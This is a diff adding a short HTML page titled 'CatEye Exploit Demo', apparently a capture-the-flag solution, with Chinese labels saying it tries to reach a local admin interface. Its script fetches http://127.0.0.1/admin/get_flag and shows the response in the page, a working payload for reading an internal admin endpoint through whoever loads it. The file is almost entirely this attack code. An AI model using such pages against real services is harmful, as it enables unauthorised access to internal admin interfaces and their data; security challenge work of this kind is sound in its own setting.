@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CatEye Exploit Demo</title>
+</head>
+<body>
+  <h1>CatEye Exploit Demo</h1>
+  <p>尝试访问本地 Admin 接口并显示内容：</p>
+  <pre id="flag_area">加载中...</pre>
+
+  <script>
+    fetch("http://127.0.0.1/admin/get_flag")
+      .then(response => response.text())
+      .then(text => {
+        document.getElementById("flag_area").textContent = text;
+      })
+      .catch(error => {
+        document.getElementById("flag_area").textContent = "访问出错: " + error;
+      });
+  </script>
+</body>
+</html>
